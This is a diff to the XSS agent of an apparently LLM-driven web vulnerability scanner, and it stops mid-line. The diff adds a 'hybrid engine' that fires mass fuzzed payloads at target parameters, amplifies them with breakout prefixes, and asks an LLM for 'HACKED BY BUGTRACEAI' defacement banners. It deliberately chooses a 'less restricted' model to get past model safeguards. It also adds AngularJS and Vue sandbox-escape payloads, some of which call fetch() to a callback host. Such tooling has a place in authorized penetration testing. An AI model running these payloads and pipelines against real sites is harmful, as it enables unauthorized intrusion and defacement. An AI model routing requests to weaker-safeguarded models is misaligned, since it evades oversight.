@@ -14,9 +14,10 @@ Date: 2026-01-10
 
 import asyncio
 import aiohttp
+import json
 from typing import Dict, List, Optional, Any, Tuple
 from pathlib import Path
-from dataclasses import dataclass, field
+from dataclasses import dataclass, field, asdict
 from enum import Enum
 import re
 import urllib.parse
@@ -53,6 +54,13 @@ from bugtrace.core.validation_status import ValidationStatus, requires_cdp_valid
 # v2.1.0: Import specialist utilities for payload loading from JSON
 from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data
 
+# v3.2.0: Import TechContextMixin for context-aware XSS detection
+from bugtrace.agents.mixins.tech_context import TechContextMixin
+
+# v3.1.0: Hybrid Engine imports (Go Fuzzer + Payload Amplification)
+from bugtrace.utils.payload_amplifier import PayloadAmplifier
+from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection
+
 logger = get_logger("agents.xss_v4")
 
 
@@ -77,6 +85,7 @@ class XSSFinding:
     validation_method: str
     evidence: Dict[str, Any]
     confidence: float
+    type: str = "XSS"  # Required for report categorization
     status: str = "PENDING_VALIDATION"  # Tiered Validation Status
     validated: bool = False  # Authority flag for VALIDATED_CONFIRMED
     screenshot_path: Optional[str] = None
@@ -100,10 +109,10 @@ class XSSFinding:
 
 from bugtrace.agents.base import BaseAgent
 
-class XSSAgent(BaseAgent):
+class XSSAgent(BaseAgent, TechContextMixin):
     """
     LLM-Driven XSS Agent with multi-layer validation.
-    
+
     Flow:
     1. Register with Interactsh (get callback URL)
     2. Probe target to get HTML with reflection
@@ -111,6 +120,8 @@ class XSSAgent(BaseAgent):
     4. Send payload to target
     5. Validate via Interactsh (primary) or Vision/CDP (fallback)
     6. If failed, LLM generates bypass, repeat
+
+    v3.2: Context-aware technology stack integration via TechContextMixin
     """
     
     MAX_BYPASS_ATTEMPTS = 6
@@ -189,9 +200,10 @@ class XSSAgent(BaseAgent):
 
         # Tools
         self.interactsh: Optional[InteractshClient] = None
-        # Hunter Phase: Use Playwright (prefer_cdp=False) for safe multi-threaded validation.
-        # This avoiding CDP deadlocks/pkill issues in Discovery phase.
-        self.verifier = XSSVerifier(headless=headless, prefer_cdp=False)
+        # v3.2: Enable CDP as fallback for deep validation
+        # Exploitation phase is single-threaded per-agent, so CDP is safe here.
+        # Flow: HTTP → Playwright (L3) → CDP (L4) → CANDIDATE
+        self.verifier = XSSVerifier(headless=headless, prefer_cdp=True)
         self.payload_learner = PayloadLearner()
 
         # Results
@@ -222,6 +234,739 @@ class XSSAgent(BaseAgent):
 
         # WET → DRY transformation (Two-phase processing)
         self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A
+
+        # v3.2.0: Context-aware tech stack (loaded in start_queue_consumer)
+        self._tech_stack_context: Dict = {}
+        self._xss_prime_directive: str = ""
+
+        # v3.1.0: Hybrid Engine components
+        self._go_bridge: Optional[GoFuzzerBridge] = None
+        self._payload_amplifier: Optional[PayloadAmplifier] = None
+        self._hybrid_mode: bool = True  # Enable hybrid engine by default
+
+    # =========================================================================
+    # HYBRID ENGINE (v3.1.0): Go + Python + LLM
+    # =========================================================================
+
+    async def _init_hybrid_engine(self) -> bool:
+        """
+        Initialize the hybrid engine components (Go fuzzer + Amplifier).
+
+        Returns:
+            True if initialization succeeded
+        """
+        try:
+            # Initialize Go bridge with WAF-aware settings
+            concurrency = 50 if not self._detected_waf else 10  # Slower for WAF
+            timeout = 5 if not self._detected_waf else 10
+
+            self._go_bridge = GoFuzzerBridge(
+                concurrency=concurrency,
+                timeout=timeout
+            )
+
+            # Try to compile Go binary if needed
+            await self._go_bridge.compile_if_needed()
+
+            # Initialize payload amplifier
+            self._payload_amplifier = PayloadAmplifier()
+
+            logger.info(f"[{self.name}] Hybrid engine initialized (Go concurrency={concurrency})")
+            return True
+
+        except FileNotFoundError as e:
+            logger.warning(f"[{self.name}] Hybrid engine unavailable: {e}")
+            logger.warning(f"[{self.name}] Falling back to pure Python mode")
+            self._hybrid_mode = False
+            return False
+        except Exception as e:
+            logger.error(f"[{self.name}] Hybrid engine init failed: {e}")
+            self._hybrid_mode = False
+            return False
+
+    async def _hybrid_phase1_omniprobe(
+        self,
+        param: str,
+        interactsh_url: str
+    ) -> Optional[Reflection]:
+        """
+        Phase 1: Quick omniprobe test using Go fuzzer.
+
+        Uses the OMNI-PROBE payload (XSS + CSTI + SSTI polyglot) for
+        fast initial detection.
+
+        Returns:
+            Reflection if payload reflected, None otherwise
+        """
+        if not self._go_bridge:
+            return None
+
+        # Use the OMNI-PROBE from GOLDEN_PAYLOADS
+        omniprobe = self.GOLDEN_PAYLOADS[0].replace("{{interactsh_url}}", interactsh_url)
+
+        dashboard.log(f"[{self.name}] ⚡ Phase 1: Go Omniprobe on '{param}'", "INFO")
+        dashboard.set_current_payload(omniprobe[:50], "XSS Omniprobe", "Testing")
+
+        try:
+            reflection = await self._go_bridge.run_omniprobe(
+                url=self.url,
+                param=param,
+                omniprobe_payload=omniprobe
+            )
+
+            if reflection and reflection.reflected:
+                if not reflection.encoded:
+                    dashboard.log(
+                        f"[{self.name}] 🎯 Omniprobe REFLECTED unencoded in {reflection.context}!",
+                        "SUCCESS"
+                    )
+                    return reflection
+                else:
+                    dashboard.log(
+                        f"[{self.name}] ⚠️ Omniprobe reflected but encoded ({reflection.encoding_type})",
+                        "WARN"
+                    )
+            return None
+
+        except Exception as e:
+            logger.error(f"[{self.name}] Phase 1 omniprobe error: {e}")
+            return None
+
+    async def _hybrid_phase2_seed_generation(
+        self,
+        param: str,
+        html: str,
+        context_data: Dict,
+        interactsh_url: str,
+        seed_count: int = 50
+    ) -> List[str]:
+        """
+        Phase 2: Generate seed payloads using LLM.
+
+        Analyzes the DOM context and generates targeted seed payloads
+        optimized for the specific injection point.
+
+        Args:
+            param: Parameter name
+            html: HTML response from probe
+            context_data: Reflection context analysis
+            interactsh_url: Interactsh callback URL
+            seed_count: Number of seeds to generate
+
+        Returns:
+            List of seed payload strings
+        """
+        dashboard.log(f"[{self.name}] 🧠 Phase 2: LLM Seed Generation ({seed_count} seeds)", "INFO")
+
+        # Use existing LLM analysis but request more payloads
+        smart_payloads = await self._llm_smart_dom_analysis(
+            html=html,
+            param=param,
+            probe_string=self.PROBE_STRING,
+            interactsh_url=interactsh_url,
+            context_data=context_data
+        )
+
+        seeds = []
+
+        # Extract payload strings from LLM response
+        for sp in smart_payloads:
+            payload = sp.get("payload", "")
+            if payload:
+                seeds.append(self._clean_payload(payload, param))
+
+        # Add GOLDEN_PAYLOADS as additional seeds (proven effective)
+        for gp in self.GOLDEN_PAYLOADS[:20]:  # Top 20 golden payloads
+            payload = gp.replace("{{interactsh_url}}", interactsh_url)
+            if payload not in seeds:
+                seeds.append(payload)
+
+        # Add fragment payloads for DOM XSS coverage
+        for fp in self.FRAGMENT_PAYLOADS[:10]:
+            payload = fp.replace("{{interactsh_url}}", interactsh_url)
+            if payload not in seeds:
+                seeds.append(payload)
+
+        logger.info(f"[{self.name}] Phase 2 generated {len(seeds)} seed payloads")
+        return seeds
+
+    async def _hybrid_phase3_amplification(
+        self,
+        seeds: List[str],
+        context_data: Dict
+    ) -> List[str]:
+        """
+        Phase 3: Amplify seeds using breakout prefixes.
+
+        Multiplies seed payloads by combining with context-appropriate
+        breakout prefixes from breakouts.json.
+
+        Args:
+            seeds: List of seed payloads
+            context_data: Reflection context (determines which breakouts to use)
+
+        Returns:
+            Amplified list of payloads (seeds × breakouts)
+        """
+        if not self._payload_amplifier:
+            return seeds
+
+        dashboard.log(f"[{self.name}] 🔄 Phase 3: Amplifying {len(seeds)} seeds", "INFO")
+
+        # Determine priority based on context
+        context = context_data.get("context", "html_text")
+        max_priority = 2 if context in ("javascript", "attribute_value") else 3
+
+        amplified = self._payload_amplifier.amplify(
+            seed_payloads=seeds,
+            category="xss",
+            max_priority=max_priority,
+            deduplicate=True
+        )
+
+        dashboard.log(
+            f"[{self.name}] 📈 Amplified to {len(amplified)} payloads "
+            f"(×{len(amplified) // max(len(seeds), 1)} expansion)",
+            "INFO"
+        )
+
+        return amplified
+
+    async def _hybrid_phase4_mass_attack(
+        self,
+        param: str,
+        payloads: List[str]
+    ) -> FuzzResult:
+        """
+        Phase 4: Mass payload testing using Go fuzzer.
+
+        Fires all amplified payloads at high speed using the Go binary,
+        collecting reflection data.
+
+        Args:
+            param: Parameter to test
+            payloads: Amplified payload list
+
+        Returns:
+            FuzzResult with reflections and metadata
+        """
+        if not self._go_bridge:
+            logger.warning(f"[{self.name}] Go bridge unavailable, skipping mass attack")
+            return FuzzResult(
+                target=self.url,
+                param=param,
+                total_payloads=0,
+                total_requests=0,
+                duration_ms=0,
+                requests_per_second=0.0
+            )
+
+        dashboard.log(
+            f"[{self.name}] 🚀 Phase 4: Go Mass Attack ({len(payloads)} payloads)",
+            "INFO"
+        )
+        dashboard.set_status("XSS Mass Attack", f"Testing {len(payloads)} payloads on {param}")
+
+        result = await self._go_bridge.run(
+            url=self.url,
+            param=param,
+            payloads=payloads
+        )
+
+        if result.reflections:
+            dashboard.log(
+                f"[{self.name}] 📊 Mass attack: {len(result.reflections)} reflections "
+                f"@ {result.requests_per_second:.1f} req/s",
+                "INFO"
+            )
+        else:
+            dashboard.log(
+                f"[{self.name}] ⚠️ Mass attack: No reflections detected",
+                "WARN"
+            )
+
+        return result
+
+    async def _hybrid_phase5_validation(
+        self,
+        param: str,
+        fuzz_result: FuzzResult,
+        screenshots_dir: Path,
+        reflection_type: str,
+        surviving_chars: str,
+        injection_ctx: Any,
+        visual_payloads: Optional[List[str]] = None
+    ) -> Optional[XSSFinding]:
+        """
+        Phase 5: Validate suspicious reflections using browser.
+
+        PRIORITY ORDER:
+        1. Visual payloads (from Phase 4.5) - tested FIRST because they provide
+           screenshot evidence with "HACKED BY BUGTRACEAI" banner for Vision AI
+        2. Regular candidates from Go fuzzer
+
+        Args:
+            param: Parameter name
+            fuzz_result: Results from Go mass attack
+            screenshots_dir: Directory for validation screenshots
+            reflection_type: Context type for reporting
+            surviving_chars: Character survival metadata
+            injection_ctx: Injection context for reporting
+            visual_payloads: Payloads with visible banner (from Phase 4.5)
+
+        Returns:
+            XSSFinding if validated, None otherwise
+        """
+        # =====================================================================
+        # STEP 1: Test VISUAL PAYLOADS first (BULLETPROOF validation)
+        # These payloads inject visible "HACKED BY BUGTRACEAI" banner
+        # If one works → Screenshot → Vision confirms → MAXIMUM EVIDENCE
+        # =====================================================================
+        if visual_payloads:
+            dashboard.log(
+                f"[{self.name}] 🎨 Phase 5.1: Testing {len(visual_payloads)} VISUAL payloads first",
+                "INFO"
+            )
+
+            for i, payload in enumerate(visual_payloads):
+                if self._max_impact_achieved:
+                    break
+
+                dashboard.set_current_payload(
+                    f"VISUAL [{i+1}/{len(visual_payloads)}]",
+                    "XSS Visual Test",
+                    "Testing banner payload"
+                )
+
+                logger.debug(f"[{self.name}] Testing visual payload: {payload[:60]}...")
+
+                # Use browser validation with screenshot capture
+                evidence = await self._validate_visual_payload(
+                    param=param,
+                    payload=payload,
+                    screenshots_dir=screenshots_dir
+                )
+
+                if evidence and evidence.get("vision_confirmed"):
+                    dashboard.log(
+                        f"[{self.name}] ✅ XSS CONFIRMED via VISUAL + VISION AI!",
+                        "SUCCESS"
+                    )
+
+                    finding = self._create_xss_finding(
+                        param=param,
+                        payload=payload,
+                        context="Visual Banner Injection",
+                        validation_method="visual_playwright_vision",
+                        evidence=evidence,
+                        confidence=0.99,  # Maximum confidence with visual proof
+                        reflection_type=reflection_type,
+                        surviving_chars=surviving_chars,
+                        successful_payloads=[payload],
+                        injection_ctx=injection_ctx,
+                        escape_technique="visual_banner_injection",
+                        bypass_explanation="DeepSeek generated visual payload, Playwright executed, Vision AI confirmed banner visible"
+                    )
+
+                    return finding
+
+            dashboard.log(
+                f"[{self.name}] Visual payloads tested, falling back to regular candidates",
+                "INFO"
+            )
+
+        # =====================================================================
+        # STEP 2: Test regular candidates from Go fuzzer (original logic)
+        # =====================================================================
+        if not fuzz_result.reflections:
+            return None
+
+        # Prioritize candidates by suspiciousness
+        candidates = sorted(
+            fuzz_result.reflections,
+            key=lambda r: (
+                r.is_suspicious,
+                r.context in ("javascript", "attribute_value"),
+                not r.encoded
+            ),
+            reverse=True
+        )
+
+        dashboard.log(
+            f"[{self.name}] 🎯 Phase 5.2: Validating {len(candidates)} regular candidates",
+            "INFO"
+        )
+
+        # Validate top candidates (limit to prevent slowdown)
+        max_validations = 10
+        validated_count = 0
+
+        for reflection in candidates[:max_validations]:
+            if self._max_impact_achieved:
+                break
+
+            payload = reflection.payload
+            dashboard.set_current_payload(payload[:50], "XSS Validation", "Validating")
+
+            # Skip encoded reflections unless in very dangerous context
+            if reflection.encoded and reflection.context not in ("javascript", "event_handler"):
+                continue
+
+            validated_count += 1
+            logger.debug(
+                f"[{self.name}] Validating candidate: {payload[:60]}... "
+                f"(context={reflection.context}, encoded={reflection.encoded})"
+            )
+
+            # Use browser validation for accurate confirmation
+            evidence = await self._validate_via_browser(self.url, param, payload)
+
+            if evidence:
+                dashboard.log(
+                    f"[{self.name}] ✅ XSS CONFIRMED via browser validation!",
+                    "SUCCESS"
+                )
+
+                finding = self._create_xss_finding(
+                    param=param,
+                    payload=payload,
+                    context=f"Hybrid Engine: {reflection.context}",
+                    validation_method="hybrid_go_playwright",
+                    evidence=evidence,
+                    confidence=0.95,
+                    reflection_type=reflection_type,
+                    surviving_chars=surviving_chars,
+                    successful_payloads=[payload],
+                    injection_ctx=injection_ctx,
+                    escape_technique=f"breakout_{reflection.context}",
+                    bypass_explanation=f"Go fuzzer detected reflection in {reflection.context}, validated via Playwright"
+                )
+
+                # Learn successful breakout
+                self._update_learned_breakouts(payload)
+
+                return finding
+
+        if validated_count > 0:
+            dashboard.log(
+                f"[{self.name}] Phase 5: {validated_count} candidates tested, none confirmed",
+                "WARN"
+            )
+
+        return None
+
+    async def _validate_visual_payload(
+        self,
+        param: str,
+        payload: str,
+        screenshots_dir: Path
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Validate a visual payload (with HACKED BY BUGTRACEAI banner).
+
+        This is the BULLETPROOF validation:
+        1. Playwright navigates to URL with payload
+        2. Detects XSS execution (dialog, DOM markers)
+        3. Captures screenshot
+        4. Vision AI confirms "HACKED BY BUGTRACEAI" banner is visible
+
+        Args:
+            param: Parameter name
+            payload: Visual payload with banner injection
+            screenshots_dir: Directory to save screenshot
+
+        Returns:
+            Evidence dict with vision_confirmed=True if fully validated
+        """
+        attack_url = self._build_attack_url(param, payload)
+
+        # Use verify_xss with screenshot capture
+        result = await self.verifier.verify_xss(
+            url=attack_url,
+            screenshot_dir=str(screenshots_dir),
+            timeout=10.0,
+            max_level=3  # Playwright only for visual payloads
+        )
+
+        if not result.success:
+            return None
+
+        evidence = {
+            "playwright_confirmed": True,
+            "screenshot_path": result.screenshot_path,
+            "method": "L3: Playwright + Vision",
+            "level": 3,
+            "status": "PENDING_VISION"
+        }
+        evidence.update(result.details or {})
+
+        # CRITICAL: Vision AI validation of screenshot
+        if result.screenshot_path:
+            await self._run_vision_validation(
+                screenshot_path=result.screenshot_path,
+                attack_url=attack_url,
+                payload=payload,
+                evidence=evidence
+            )
+
+            if evidence.get("vision_confirmed"):
+                evidence["status"] = "VALIDATED_CONFIRMED"
+                evidence["validation_method"] = "visual_playwright_vision"
+                return evidence
+
+        # Playwright confirmed but Vision didn't see banner
+        # Still return evidence but without vision_confirmed
+        return evidence
+
+    def _update_learned_breakouts(self, payload: str) -> None:
+        """
+        Update breakouts.json with successful payload patterns.
+
+        Extracts the breakout prefix from a successful payload and
+        increments its success_count for future prioritization.
+        """
+        try:
+            if not self._payload_amplifier:
+                return
+
+            # Extract prefix by finding common breakout patterns
+            for prefix in self._payload_amplifier.get_prefixes(category="xss"):
+                if prefix and payload.startswith(prefix):
+                    # Found the breakout used - would update success_count here
+                    logger.debug(f"[{self.name}] Learned successful breakout: {prefix}")
+                    self.payload_learner.record_success(payload, "xss")
+                    break
+
+        except Exception as e:
+            logger.debug(f"[{self.name}] Failed to update learned breakouts: {e}")
+
+    async def _run_hybrid_test_param(
+        self,
+        param: str,
+        interactsh_domain: str,
+        screenshots_dir: Path
+    ) -> Optional[XSSFinding]:
+        """
+        Run the full 5-phase hybrid test on a single parameter.
+
+        This is the main hybrid engine entry point that orchestrates
+        all phases: Omniprobe → Seed → Amplify → Mass Attack → Validate.
+
+        Args:
+            param: Parameter to test
+            interactsh_domain: Interactsh callback domain
+            screenshots_dir: Directory for screenshots
+
+        Returns:
+            XSSFinding if XSS confirmed, None otherwise
+        """
+        interactsh_url = f"http://{interactsh_domain}" if interactsh_domain else ""
+
+        # Probe and analyze context first (reuse existing logic)
+        probe_data = await self._param_probe_and_setup(param)
+        if not probe_data:
+            return None
+
+        html, probe_url, status_code, context_data, reflection_type, surviving_chars, injection_ctx, _ = probe_data
+
+        # Skip if no reflection detected and not blocked
+        if not context_data.get("reflected") and not context_data.get("is_blocked"):
+            dashboard.log(f"[{self.name}] No reflection on '{param}', skipping hybrid", "INFO")
+            return None
+
+        # === PHASE 1: OMNIPROBE (Quick check) ===
+        omni_reflection = await self._hybrid_phase1_omniprobe(param, interactsh_url)
+        if omni_reflection and omni_reflection.is_suspicious:
+            # Omniprobe looked promising - validate immediately
+            omni_payload = self.GOLDEN_PAYLOADS[0].replace("{{interactsh_url}}", interactsh_url)
+            evidence = await self._validate_via_browser(self.url, param, omni_payload)
+            if evidence:
+                return self._create_xss_finding(
+                    param=param,
+                    payload=omni_payload,
+                    context="Omniprobe direct hit",
+                    validation_method="hybrid_omniprobe",
+                    evidence=evidence,
+                    confidence=0.98,
+                    reflection_type=reflection_type,
+                    surviving_chars=surviving_chars,
+                    successful_payloads=[omni_payload],
+                    injection_ctx=injection_ctx,
+                    escape_technique="omniprobe_polyglot",
+                    bypass_explanation="OMNI-PROBE polyglot achieved direct execution"
+                )
+
+        # === PHASE 2: SEED GENERATION (LLM) ===
+        seeds = await self._hybrid_phase2_seed_generation(
+            param=param,
+            html=html,
+            context_data=context_data,
+            interactsh_url=interactsh_url
+        )
+
+        if not seeds:
+            dashboard.log(f"[{self.name}] No seeds generated, skipping amplification", "WARN")
+            return None
+
+        # === PHASE 3: AMPLIFICATION (Python) ===
+        amplified_payloads = await self._hybrid_phase3_amplification(
+            seeds=seeds,
+            context_data=context_data
+        )
+
+        # === PHASE 4: MASS ATTACK (Go) ===
+        fuzz_result = await self._hybrid_phase4_mass_attack(
+            param=param,
+            payloads=amplified_payloads
+        )
+
+        # === PHASE 4.5: VISUAL PAYLOAD GENERATION (DeepSeek) ===
+        # If we have reflections, generate visual payloads with "HACKED BY BUGTRACEAI"
+        # This is the BULLETPROOF validation: LLM generates banner payloads → Screenshot → Vision confirms
+        visual_payloads = await self._hybrid_phase45_visual_generation(
+            param=param,
+            fuzz_result=fuzz_result
+        )
+
+        # === PHASE 5: VALIDATION (Python/Playwright) ===
+        finding = await self._hybrid_phase5_validation(
+            param=param,
+            fuzz_result=fuzz_result,
+            screenshots_dir=screenshots_dir,
+            reflection_type=reflection_type,
+            surviving_chars=surviving_chars,
+            injection_ctx=injection_ctx,
+            visual_payloads=visual_payloads  # Pass visual payloads for priority testing
+        )
+
+        return finding
+
+    async def _hybrid_phase45_visual_generation(
+        self,
+        param: str,
+        fuzz_result: "FuzzResult"
+    ) -> List[str]:
+        """
+        Phase 4.5: Generate visual payloads with HACKED BY BUGTRACEAI banner.
+
+        When Mass Attack finds reflections, we ask DeepSeek to generate
+        10 payloads that inject a VISIBLE RED BANNER. These are tested
+        first in Phase 5 because they provide VISUAL PROOF for Vision AI.
+
+        Args:
+            param: Parameter name
+            fuzz_result: Results from Go fuzzer with reflection contexts
+
+        Returns:
+            List of visual payloads optimized for screenshot validation
+        """
+        if not fuzz_result.reflections:
+            return []
+
+        # Group reflections by context
+        contexts_found = set()
+        sample_payloads = {}
+
+        for ref in fuzz_result.reflections[:20]:  # Sample top 20
+            ctx = ref.context or "html_text"
+            if ctx not in contexts_found:
+                contexts_found.add(ctx)
+                sample_payloads[ctx] = ref.payload
+
+        if not contexts_found:
+            return []
+
+        dashboard.log(
+            f"[{self.name}] 🎨 Phase 4.5: Generating visual payloads for {len(contexts_found)} contexts",
+            "INFO"
+        )
+
+        # Ask DeepSeek for visual payloads
+        visual_payloads = await self._ask_deepseek_visual_payloads(
+            param=param,
+            contexts=list(contexts_found),
+            sample_payloads=sample_payloads
+        )
+
+        if visual_payloads:
+            dashboard.log(
+                f"[{self.name}] 🎯 Generated {len(visual_payloads)} visual payloads with banner",
+                "SUCCESS"
+            )
+
+        return visual_payloads
+
+    async def _ask_deepseek_visual_payloads(
+        self,
+        param: str,
+        contexts: List[str],
+        sample_payloads: Dict[str, str]
+    ) -> List[str]:
+        """
+        Ask DeepSeek to generate payloads that inject visible HACKED BY BUGTRACEAI banner.
+
+        Args:
+            param: Parameter name
+            contexts: List of reflection contexts found (e.g., ["html_text", "attribute_value"])
+            sample_payloads: Example payloads that reflected per context
+
+        Returns:
+            List of 10 visual payloads
+        """
+        from bugtrace.core.llm_client import llm_client
+
+        contexts_str = ", ".join(contexts)
+        samples_str = "\n".join([f"- {ctx}: {p[:80]}..." for ctx, p in sample_payloads.items()])
+
+        prompt = f"""You are an XSS payload expert. I found reflections in these contexts: {contexts_str}
+
+Sample payloads that reflected:
+{samples_str}
+
+Generate exactly 10 XSS payloads that will:
+1. Break out of the current context
+2. Inject a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"
+
+The banner MUST be visible on the page. Use this pattern:
+<div id="bt-pwn" style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>
+
+Return ONLY the payloads, one per line, no explanations, no numbering.
+Each payload should target a different context or use a different breakout technique."""
+
+        try:
+            response = await llm_client.generate(
+                prompt=prompt,
+                module_name="XSS-VisualGen",
+                model_override=settings.MUTATION_MODEL,  # DeepSeek - less restricted
+                temperature=0.7,
+                max_tokens=2000
+            )
+
+            if not response:
+                return []
+
+            # Parse payloads from response
+            payloads = []
+            for line in response.strip().split("\n"):
+                line = line.strip()
+                # Skip empty lines and explanations
+                if not line or line.startswith("#") or line.startswith("//"):
+                    continue
+                # Remove numbering like "1." or "1)"
+                if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
+                    line = line[2:].strip()
+                if line and len(line) > 10:  # Minimum payload length
+                    payloads.append(line)
+
+            return payloads[:10]  # Max 10 payloads
+
+        except Exception as e:
+            logger.warning(f"[{self.name}] Visual payload generation failed: {e}")
+            return []
+
+    # =========================================================================
+    # END HYBRID ENGINE
+    # =========================================================================
 
     def _get_snippet(self, text: str, target: str, max_len: int = 200) -> str:
         """Extract snippet around the target string."""
@@ -339,6 +1084,16 @@ class XSSAgent(BaseAgent):
                 "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
                 "<svg/onload=fetch('https://{{interactsh_url}}')>",
                 "<script>fetch('https://{{interactsh_url}}')</script>",
+            ],
+            # Framework template injection payloads (AngularJS, Vue, etc.)
+            "template": [
+                "{{constructor.constructor('fetch(\"https://{{interactsh_url}}\")')()}}",
+                "{{constructor.constructor('alert(1)')()}}",
+                "{{$on.constructor('alert(1)')()}}",
+                "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
+                "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}",
+                # Vue.js
+                "{{_c.constructor('alert(1)')()}}",
             ],
         }
 
@@ -838,8 +1593,28 @@ class XSSAgent(BaseAgent):
         return True
 
     async def _loop_test_params(self, interactsh_domain: str, screenshots_dir: Path):
-        """Phase 3: Test each parameter for XSS."""
+        """
+        Phase 3: Test each parameter for XSS.
+
+        v3.1.0: Now uses the Hybrid Engine (Go + Python + LLM) when available,
+        with automatic fallback to pure Python mode if Go is unavailable.
+        """
         logger.info(f"[{self.name}] Phase 3: Testing each parameter")
+
+        # v3.1.0: Initialize hybrid engine if enabled
+        if self._hybrid_mode:
+            hybrid_ready = await self._init_hybrid_engine()
+            if hybrid_ready:
+                dashboard.log(
+                    f"[{self.name}] 🚀 Hybrid Engine ACTIVE (Go + Python + LLM)",
+                    "INFO"
+                )
+            else:
+                dashboard.log(
+                    f"[{self.name}] ⚠️ Hybrid Engine unavailable, using pure Python",
+                    "WARN"
+                )
+
         for param in self.params:
             # TASK-50: Thread-safe deduplication check
             async with self._tested_params_lock:
@@ -850,7 +1625,13 @@ class XSSAgent(BaseAgent):
 
             logger.info(f"[{self.name}] Testing param: {param}")
 
-            finding = await self._test_parameter(param, interactsh_domain, screenshots_dir)
+            # v3.1.0: Use hybrid engine if available, fallback to classic method
+            if self._hybrid_mode and self._go_bridge:
+                finding = await self._run_hybrid_test_param(
+                    param, interactsh_domain, screenshots_dir
+                )
+            else:
+                finding = await self._test_parameter(param, interactsh_domain, screenshots_dir)
 
             if not finding:
                 continue
@@ -916,19 +1697,6 @@ class XSSAgent(BaseAgent):
         except Exception as e:
             logger.debug(f"POST form testing failed: {e}")
 
-        # 4.2: Test Header Injection
-        if not self._max_impact_achieved:
-            dashboard.log(f"[{self.name}] 🔧 Phase 4.2: Testing header injection...", "INFO")
-            try:
-                header_finding = await self._test_header_injection(
-                    interactsh_domain, screenshots_dir
-                )
-                if header_finding:
-                    self.findings.append(header_finding)
-                    dashboard.log(f"[{self.name}] 🎯 Header XSS found!", "SUCCESS")
-            except Exception as e:
-                logger.debug(f"Header injection testing failed: {e}")
-
     # =========================================================================
     # Queue Consumption Mode (Phase 19) - WET→DRY
     # =========================================================================
@@ -969,17 +1737,91 @@ class XSSAgent(BaseAgent):
         return dry_list
 
     async def _llm_analyze_and_dedup(self, wet_findings: List[Dict], context: str) -> List[Dict]:
+        """
+        Call LLM to analyze WET list and generate DRY list (v3.2: Context-Aware).
+
+        Uses tech stack context for intelligent XSS-specific filtering.
+        """
         from bugtrace.core.llm_client import llm_client
         import json
-        response = await llm_client.generate(
-            prompt=f"Deduplicate {len(wet_findings)} XSS findings. Same URL+param+context=DUPLICATE. Different context=DIFFERENT (HTML vs JS). Return JSON: {{\"findings\":[...]}}. WET: {json.dumps(wet_findings, indent=2)}",
-            system_prompt="Expert XSS context-aware deduplication analyst.",
-            module_name="XSS_DEDUP",
-            temperature=0.2
-        )
+
+        # Extract tech stack info for prompt
+        tech_stack = getattr(self, '_tech_stack_context', {}) or {}
+        lang = tech_stack.get('lang', 'generic')
+        server = tech_stack.get('server', 'generic')
+        waf = tech_stack.get('waf')
+        frameworks = tech_stack.get('frameworks', [])
+
+        # Get XSS-specific context prompts
+        xss_prime_directive = getattr(self, '_xss_prime_directive', '')
+        xss_dedup_context = self.generate_xss_dedup_context(tech_stack) if tech_stack else ''
+
+        # Build enhanced system prompt with tech context (v3.2)
+        system_prompt = f"""You are an expert XSS security analyst with deep knowledge of web frameworks.
+
+{xss_prime_directive}
+
+{xss_dedup_context}
+
+## TARGET CONTEXT
+- Backend Language: {lang}
+- Web Server: {server}
+- WAF: {waf or 'None detected'}
+- Frameworks: {', '.join(frameworks[:3]) if frameworks else 'Unknown'}
+
+## WET LIST ({len(wet_findings)} potential XSS findings):
+{json.dumps(wet_findings, indent=2)}
+
+## TASK
+1. Analyze each finding considering the injection context (HTML body, attribute, JS, etc.)
+2. **CRITICAL - Framework Detection from Findings:**
+   - ALWAYS check each item's nested "finding.reasoning" field for framework mentions
+   - Look for: AngularJS, Angular, Vue, React, Ember, Svelte in the reasoning text
+   - If reasoning mentions "AngularJS" or "Angular 1.x" → recommended_payload_type: "template"
+   - If reasoning mentions "Vue" → recommended_payload_type: "template"
+   - If reasoning mentions "React" → recommended_payload_type: "template"
+   - Template payloads like {{constructor.constructor('alert(1)')()}} bypass framework sandboxes
+   - Event handlers (onclick, onerror, onfocus) are BLOCKED by Angular/Vue/React CSP
+   - THIS IS CRITICAL: Event handler payloads WILL FAIL on these frameworks
+3. Apply context-aware deduplication:
+   - Same URL + param + SAME context type → DUPLICATE
+   - Same URL + param + DIFFERENT context type → DIFFERENT (keep both)
+   - Different endpoints → DIFFERENT (keep both)
+4. Prioritize findings based on framework exploitability
+5. Filter findings unlikely to succeed given the tech stack
+
+## OUTPUT FORMAT (JSON only, no markdown):
+{{
+  "findings": [
+    {{
+      "url": "...",
+      "parameter": "...",
+      "context": "html_body|attribute|javascript|url|css",
+      "rationale": "why this is unique and exploitable",
+      "attack_priority": 1-5,
+      "recommended_payload_type": "svg|img|script|event_handler|template"
+    }}
+  ],
+  "duplicates_removed": <count>,
+  "reasoning": "Brief explanation of deduplication strategy"
+}}"""
+
         try:
-            return json.loads(response).get("findings", wet_findings)
-        except:
+            response = await llm_client.generate(
+                prompt="Analyze the WET list above and return deduplicated XSS findings in JSON format.",
+                system_prompt=system_prompt,
+                module_name="XSS_DEDUP",
+                temperature=0.2
+            )
+
+            dry_data = json.loads(response)
+            dry_list = dry_data.get("findings", wet_findings)
+
+            logger.info(f"[{self.name}] LLM deduplication: {dry_data.get('reasoning', 'No reasoning provided')}")
+            return dry_list
+
+        except Exception as e:
+            logger.error(f"[{self.name}] LLM deduplication failed: {e}. Falling back to fingerprint dedup.")
             return self._fallback_fingerprint_dedup(wet_findings)
 
     def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
@@ -997,21 +1839,24 @@ class XSSAgent(BaseAgent):
         for idx, f in enumerate(self._dry_findings, 1):
             try:
                 self.url = f["url"]
-                result = await self._test_single_param_from_queue(f["url"], f["parameter"], f.get("finding",{}))
-                if result and result.get("validated"):
+                # v3.2: Pass recommended_payload_type from LLM dedup (template for Angular/Vue)
+                payload_type = f.get("recommended_payload_type")
